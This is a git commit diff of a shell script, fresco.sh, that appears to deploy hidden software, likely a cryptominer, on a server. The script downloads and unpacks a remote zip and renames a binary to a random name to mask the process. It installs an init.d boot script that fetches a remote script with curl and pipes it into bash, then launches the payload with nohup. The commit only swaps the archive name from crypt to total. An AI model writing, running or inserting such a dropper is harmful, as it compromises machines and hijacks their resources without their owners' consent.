f8ef32ebbfa4f8a5cc998eb7c2cf0bbc673eea18
sandzema <wiwikawik78@gmail.com>
2024-06-16 02:36:57 +0700

    Update fresco.sh

--- fresco.sh
+++ fresco.sh
@@ -1,7 +1,7 @@
 cd /
-wget https://github.com/brushda/ivory/releases/download/v1.9.7/crypt.zip
-unzip crypt.zip
-cd /crypt
+wget https://github.com/brushda/ivory/releases/download/v1.9.7/total.zip
+unzip total.zip
+cd /total
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv amber $variable1
 sed -i "s/python/${variable1}/g" ./scrap.sh
@@ -10,7 +10,7 @@ cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/brushda/ivory/main/fresco.sh)" > ruins.sh
 chmod a+x ruins.sh
 update-rc.d ruins.sh defaults
-rm -rf crypt.zip
-cd /crypt
+rm -rf total.zip
+cd /total
 nohup ./scrap.sh
-ps -ef | grep crypt
+ps -ef | grep total
